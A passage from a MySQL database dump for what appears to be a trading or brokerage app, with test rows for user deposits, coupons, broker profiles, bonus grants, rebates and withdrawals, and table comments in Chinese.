INSERT INTO `user_charge` VALUES ('109', '100001', '100001201708251002103672', '0.01', '1', '1', '2017-08-25 10:02:10', '2017-08-25 10:02:10');
INSERT INTO `user_charge` VALUES ('110', '100001', '100001201708251004102682', '0.01', '1', '1', '2017-08-25 10:04:10', '2017-08-25 10:04:10');
INSERT INTO `user_charge` VALUES ('111', '100001', '100001201708251004183217', '0.01', '1', '1', '2017-08-25 10:04:18', '2017-08-25 10:04:18');
INSERT INTO `user_charge` VALUES ('112', '100001', '100001201708251026274822', '0.01', '1', '1', '2017-08-25 10:26:27', '2017-08-25 10:26:27');
INSERT INTO `user_charge` VALUES ('113', '100001', '100001201708251026534364', '0.01', '1', '1', '2017-08-25 10:26:53', '2017-08-25 10:26:53');
INSERT INTO `user_charge` VALUES ('114', '100001', '100001201708251027004780', '0.01', '1', '1', '2017-08-25 10:27:00', '2017-08-25 10:27:00');
INSERT INTO `user_charge` VALUES ('115', '100001', '100001201708251031436146', '0.01', '1', '1', '2017-08-25 10:31:43', '2017-08-25 10:31:43');
INSERT INTO `user_charge` VALUES ('116', '100001', '100001201708251032168828', '0.01', '1', '1', '2017-08-25 10:32:16', '2017-08-25 10:32:16');
INSERT INTO `user_charge` VALUES ('117', '100001', '100001201708251032576332', '0.01', '1', '1', '2017-08-25 10:32:57', '2017-08-25 10:32:57');
INSERT INTO `user_charge` VALUES ('118', '100001', '100001201708251033055326', '0.01', '1', '1', '2017-08-25 10:33:05', '2017-08-25 10:33:05');
INSERT INTO `user_charge` VALUES ('119', '100001', '100001201708251034136206', '0.01', '1', '1', '2017-08-25 10:34:13', '2017-08-25 10:34:13');
INSERT INTO `user_charge` VALUES ('120', '100001', '100001201708251035531667', '0.01', '1', '1', '2017-08-25 10:35:53', '2017-08-25 10:35:53');
INSERT INTO `user_charge` VALUES ('121', '100001', '100001201708251036005787', '0.01', '1', '1', '2017-08-25 10:36:00', '2017-08-25 10:36:00');
INSERT INTO `user_charge` VALUES ('122', '100001', '100001201708251036311407', '0.01', '1', '1', '2017-08-25 10:36:31', '2017-08-25 10:36:31');
INSERT INTO `user_charge` VALUES ('123', '100001', '100001201708251039249825', '0.01', '1', '1', '2017-08-25 10:39:24', '2017-08-25 10:39:24');
INSERT INTO `user_charge` VALUES ('124', '100001', '100001201708251043291518', '0.01', '4', '1', '2017-08-25 10:43:29', '2017-08-25 10:43:29');
INSERT INTO `user_charge` VALUES ('125', '100001', '100001201708251043479506', '0.01', '4', '1', '2017-08-25 10:43:47', '2017-08-25 10:43:47');
INSERT INTO `user_charge` VALUES ('126', '100001', '100001201708251043526465', '0.01', '1', '1', '2017-08-25 10:43:52', '2017-08-25 10:43:52');
INSERT INTO `user_charge` VALUES ('127', '100001', '100001201708251044011673', '0.01', '4', '1', '2017-08-25 10:44:01', '2017-08-25 10:44:01');
INSERT INTO `user_charge` VALUES ('128', '100001', '100001201708251044053319', '0.01', '1', '1', '2017-08-25 10:44:05', '2017-08-25 10:44:05');
INSERT INTO `user_charge` VALUES ('129', '100001', '100001201708291628235631', '0.01', '1', '1', '2017-08-29 16:28:23', '2017-08-29 16:28:23');
INSERT INTO `user_charge` VALUES ('130', '100001', '100001201708291628322245', '0.01', '1', '1', '2017-08-29 16:28:32', '2017-08-29 16:28:32');
INSERT INTO `user_charge` VALUES ('131', '100001', '100001201708291639547158', '0.01', '1', '1', '2017-08-29 16:39:54', '2017-08-29 16:39:54');
INSERT INTO `user_charge` VALUES ('132', '100001', '100001201708300952283218', '0.01', '1', '1', '2017-08-30 09:52:28', '2017-08-30 09:52:28');
INSERT INTO `user_charge` VALUES ('133', '100001', '100001201708300953101762', '0.01', '1', '1', '2017-08-30 09:53:10', '2017-08-30 09:53:10');
INSERT INTO `user_charge` VALUES ('134', '100001', '100001201708300953287340', '0.01', '1', '1', '2017-08-30 09:53:28', '2017-08-30 09:53:28');
INSERT INTO `user_charge` VALUES ('135', '100001', '100001201708300953356968', '0.01', '1', '1', '2017-08-30 09:53:35', '2017-08-30 09:53:35');
INSERT INTO `user_charge` VALUES ('136', '100001', '100001201708300954105641', '0.01', '1', '1', '2017-08-30 09:54:10', '2017-08-30 09:54:10');
INSERT INTO `user_charge` VALUES ('137', '100001', '100001201708300954311276', '0.01', '1', '1', '2017-08-30 09:54:31', '2017-08-30 09:54:31');
INSERT INTO `user_charge` VALUES ('138', '100001', '100001201708300954374209', '0.01', '1', '1', '2017-08-30 09:54:37', '2017-08-30 09:54:37');
INSERT INTO `user_charge` VALUES ('139', '100001', '100001201708301149389060', '0.01', '1', '1', '2017-08-30 11:49:38', '2017-08-30 11:49:38');
INSERT INTO `user_charge` VALUES ('140', '100001', '100001201708301150226999', '0.01', '1', '1', '2017-08-30 11:50:22', '2017-08-30 11:50:22');
INSERT INTO `user_charge` VALUES ('141', '100001', '100001201708301150395017', '0.01', '1', '1', '2017-08-30 11:50:39', '2017-08-30 11:50:39');
INSERT INTO `user_charge` VALUES ('142', '100001', '100001201708311407498953', '0.01', '1', '1', '2017-08-31 14:07:49', '2017-08-31 14:07:49');
INSERT INTO `user_charge` VALUES ('143', '100001', '100001201708311409314115', '9999.74', '4', '1', '2017-08-31 14:09:31', '2017-08-31 14:09:31');
INSERT INTO `user_charge` VALUES ('144', '100001', '100001201708311409403683', '520.71', '4', '1', '2017-08-31 14:09:40', '2017-08-31 14:09:40');
INSERT INTO `user_charge` VALUES ('145', '100001', '100001201708311410069469', '200.73', '4', '1', '2017-08-31 14:10:06', '2017-08-31 14:10:06');

-- ----------------------------
-- Table structure for user_coupon
-- ----------------------------
DROP TABLE IF EXISTS `user_coupon`;
CREATE TABLE `user_coupon` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `coupon_id` int(11) NOT NULL,
  `user_id` int(11) NOT NULL,
  `use_state` tinyint(4) DEFAULT '1' COMMENT '使用状态：1未使用，2已使用，-1已过期',
  `number` int(11) DEFAULT '1' COMMENT '数量',
  `valid_time` datetime DEFAULT NULL COMMENT '过期时间',
  `created_at` datetime DEFAULT NULL COMMENT '获得时间',
  `updated_at` datetime DEFAULT NULL COMMENT '使用时间',
  PRIMARY KEY (`id`),
  KEY `user_coupon_id` (`coupon_id`,`user_id`) USING BTREE
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='用户持有优惠券表';

-- ----------------------------
-- Records of user_coupon
-- ----------------------------

-- ----------------------------
-- Table structure for user_extend
-- ----------------------------
DROP TABLE IF EXISTS `user_extend`;
CREATE TABLE `user_extend` (
  `user_id` int(11) NOT NULL,
  `realname` varchar(20) NOT NULL COMMENT '真实姓名',
  `mobile` char(11) DEFAULT '' COMMENT '手机号',
  `point` tinyint(3) DEFAULT '0' COMMENT '返点百分比%',
  `rebate_account` decimal(13,2) DEFAULT '0.00' COMMENT '返佣金额',
  `coding` int(10) DEFAULT '0' COMMENT '机构编码或微圈编码',
  `state` tinyint(4) DEFAULT '1',
  `created_at` datetime DEFAULT NULL COMMENT '注册时间',
  `created_by` int(11) DEFAULT NULL,
  `updated_at` datetime DEFAULT NULL,
  `updated_by` int(11) DEFAULT NULL,
  PRIMARY KEY (`user_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='用户表扩展经纪人';

-- ----------------------------
-- Records of user_extend
-- ----------------------------
INSERT INTO `user_extend` VALUES ('100001', '测试', '111', '0', '0.00', '0', '1', '2017-08-25 16:54:30', null, null, null);

-- ----------------------------
-- Table structure for user_give
-- ----------------------------
DROP TABLE IF EXISTS `user_give`;
CREATE TABLE `user_give` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) NOT NULL COMMENT '用户ID',
  `amount` decimal(11,2) NOT NULL COMMENT '金额',
  `created_at` datetime DEFAULT NULL COMMENT '赠金时间',
  `created_by` int(11) DEFAULT NULL,
  `updated_at` datetime DEFAULT NULL,
  `updated_by` int(11) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=13 DEFAULT CHARSET=utf8 COMMENT='赠金记录表';

-- ----------------------------
-- Records of user_give
-- ----------------------------
INSERT INTO `user_give` VALUES ('11', '100001', '100.00', '2017-08-25 16:54:30', '1', '2017-08-25 16:54:30', '1');
INSERT INTO `user_give` VALUES ('12', '100002', '10.00', '2017-08-25 16:54:53', '1', '2017-08-25 16:54:53', '1');

-- ----------------------------
-- Table structure for user_rebate
-- ----------------------------
DROP TABLE IF EXISTS `user_rebate`;
CREATE TABLE `user_rebate` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `order_id` int(11) NOT NULL DEFAULT '0' COMMENT '订单id',
  `user_id` int(11) NOT NULL COMMENT '返点用户ID',
  `pid` int(11) NOT NULL COMMENT '经纪人用户id',
  `amount` decimal(11,2) NOT NULL COMMENT '返点金额',
  `point` tinyint(4) NOT NULL COMMENT '返点百分比%',
  `created_at` datetime DEFAULT NULL COMMENT '申请时间',
  `updated_at` datetime DEFAULT NULL COMMENT '审核时间',
  PRIMARY KEY (`id`),
  KEY `user_id` (`user_id`),
  KEY `pid` (`pid`)
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8 COMMENT='返点记录表';

-- ----------------------------
-- Records of user_rebate
-- ----------------------------
INSERT INTO `user_rebate` VALUES ('1', '1', '100001', '4', '1.05', '70', '2017-08-15 17:54:17', '2017-08-15 17:54:17');
INSERT INTO `user_rebate` VALUES ('2', '1', '100001', '10', '0.15', '10', '2017-08-15 17:54:17', '2017-08-15 17:54:17');
INSERT INTO `user_rebate` VALUES ('3', '2', '100001', '4', '1.05', '70', '2017-08-15 18:03:53', '2017-08-15 18:03:53');
INSERT INTO `user_rebate` VALUES ('4', '2', '100001', '10', '0.15', '10', '2017-08-15 18:03:53', '2017-08-15 18:03:53');

-- ----------------------------
-- Table structure for user_withdraw
-- ----------------------------
DROP TABLE IF EXISTS `user_withdraw`;
CREATE TABLE `user_withdraw` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) NOT NULL COMMENT '用户ID',
  `amount` decimal(11,2) NOT NULL COMMENT '出金金额',
  `account_id` tinyint(4) NOT NULL COMMENT '出金账号ID',
  `out_sn` varchar(25) DEFAULT NULL COMMENT '订单号',
  `type` tinyint(4) DEFAULT '1' COMMENT '类型',
  `op_state` tinyint(4) DEFAULT '1' COMMENT '操作状态：1待审核，2已操作，-1不通过',
  `created_at` datetime DEFAULT NULL COMMENT '申请时间',
  `updated_at` datetime DEFAULT NULL COMMENT '审核时间',
  PRIMARY KEY (`id`),
  KEY `user_id` (`user_id`)
) ENGINE=InnoDB AUTO_INCREMENT=8 DEFAULT CHARSET=utf8 COMMENT='用户提款表';

-- ----------------------------
-- Records of user_withdraw
-- ----------------------------
INSERT INTO `user_withdraw` VALUES ('1', '100001', '200.00', '3', null, '1', '1', '2017-06-22 10:31:56', '2017-06-22 10:31:56');
INSERT INTO `user_withdraw` VALUES ('2', '100001', '200.00', '3', null, '1', '1', '2017-06-22 10:36:16', '2017-06-22 10:36:16');
INSERT INTO `user_withdraw` VALUES ('3', '100001', '340.00', '2', null, '2', '-1', '2017-06-22 11:55:00', '2017-06-23 09:21:05');
INSERT INTO `user_withdraw` VALUES ('4', '100001', '1000.00', '1', null, '1', '1', '2017-06-22 14:47:48', '2017-06-22 14:47:48');
INSERT INTO `user_withdraw` VALUES ('5', '100001', '123.00', '2', null, '2', '-1', '2017-06-22 15:01:38', '2017-06-23 09:20:54');
INSERT INTO `user_withdraw` VALUES ('6', '100001', '3000.00', '1', null, '1', '1', '2017-06-22 15:04:46', '2017-06-22 15:04:46');
INSERT INTO `user_withdraw` VALUES ('7', '100001', '123.00', '2', null, '2', '2', '2017-06-22 18:43:38', '2017-06-23 09:19:54');
